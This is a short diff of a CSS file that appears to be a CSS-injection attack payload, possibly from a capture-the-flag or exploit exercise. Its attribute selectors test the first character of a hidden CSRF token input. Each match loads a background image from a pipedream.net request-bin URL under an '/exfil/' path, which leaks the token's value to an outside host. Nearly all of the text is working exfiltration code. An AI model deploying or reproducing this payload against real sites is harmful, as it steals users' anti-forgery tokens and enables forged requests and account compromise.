@@ -1,8 +1,9 @@
 input.csrf[value^=a]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/a);
 }
-html, body, input[name=csrf][value^=b]{
-    background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/b);
+
+input.csrf[value^=y]{
+    background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/y);
 }
 
 input.csrf[name=csrf][value^=9]{
@@ -17,5 +18,5 @@ html, body {
 }
 input.csrf  {
 	height: 200px;
-	background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/z);
+	background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/rien);
 }
